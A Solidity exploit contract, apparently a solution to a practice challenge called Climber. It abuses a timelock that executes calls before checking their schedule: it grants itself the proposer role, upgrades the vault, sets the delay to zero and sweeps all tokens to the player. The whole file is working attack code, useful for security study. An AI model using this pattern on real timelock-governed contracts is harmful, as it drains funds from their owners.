// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IClimberTimeLock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

interface IClimberVault {
    function _setSweeper(address newSweeper) external;

    function sweepFunds(address token) external;
}

/**
 * !!! Within the execute function of the TimeLock contract: !!!
 *  1. Grant Proposer Role to the attacker contract
 *  2. Upgrade the Vault contract to a new implementation with modified sweepFunds function
 *  3. Set the delay to 0 so we can do everything in 1 transaction
 *  4. Schedule the attack
 *  5. Execute the attack
 */

contract Attack12 {
    IClimberTimeLock private immutable timelock;
    IClimberVault private immutable vault;
    IERC20 public immutable token;
    address public immutable player;

    address[] private scheduledTargets;
    bytes[] private scheduledData;

    constructor(
        address _timelock,
        address _vault,
        address _token,
        address _player
    ) {
        timelock = IClimberTimeLock(_timelock);
        vault = IClimberVault(_vault);
        token = IERC20(_token);
        player = _player;
    }

    function setScheduleData(
        address[] memory _targets,
        bytes[] memory _data
    ) external {
        scheduledTargets = _targets;
        scheduledData = _data;
    }

    function attack() external {
        uint256[] memory noValues = new uint256[](scheduledTargets.length);

        timelock.schedule(scheduledTargets, noValues, scheduledData, 0x0);
        vault._setSweeper(address(this)); // RektVault new implementation
        vault.sweepFunds(address(token)); // RektVault new implementation

        // Withdraw the tokens from the attacker contract
        token.transfer(player, token.balanceOf(address(this)));
    }
}
